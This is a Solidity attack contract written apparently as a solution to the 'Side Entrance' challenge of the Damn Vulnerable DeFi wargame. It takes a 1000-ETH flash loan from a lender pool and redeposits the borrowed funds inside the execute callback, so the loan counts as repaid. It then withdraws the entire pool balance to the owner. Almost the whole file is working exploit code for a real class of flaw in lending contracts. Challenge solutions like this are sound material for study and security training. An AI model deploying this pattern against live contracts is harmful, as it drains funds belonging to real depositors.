// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/**
 * @title SideEntranceAttack
 * @author wzrdk3lly
 * @notice attack contract to complete the SideEntrance DamnVulnerableDefi challenge
 */
contract SideEntranceAttack{

    address payable immutable owner;

    ISideEndtranceLenderPool public IsideEntranceLenderPool;

    error NotOGSender();

    event ReceivedEth(uint256 _receiveAmount);

    event SentEthTo(address _receiver);

    constructor(address _lenderPoolAddress, address payable _owner) {

        owner = _owner;
        IsideEntranceLenderPool = ISideEndtranceLenderPool(_lenderPoolAddress);
    }
    /**
     * @notice attack function will execute the flashloan, deposit eth, and then withdraw all the eth 
     */
    function attack() external payable onlyOwner{
        
        IsideEntranceLenderPool.flashLoan(1_000e18);// Step 1: call flashloan
        IsideEntranceLenderPool.withdraw();

        (bool success , ) = owner.call{value: 1000 ether}("");

        require(success, "Something went wrong");
        emit SentEthTo(owner);

    }
    /**
     * @notice lender pool will invoke this execut function 
     */
    function execute() public payable {
       //Step2: sideEntranceLenderPool will call execute 
       IsideEntranceLenderPool.deposit{value: 1_000e18}();
       emit ReceivedEth(msg.value);
       
    }

     receive() external payable{}

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOGSender();
        _;

    }


}

interface ISideEndtranceLenderPool{
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256) external;

}
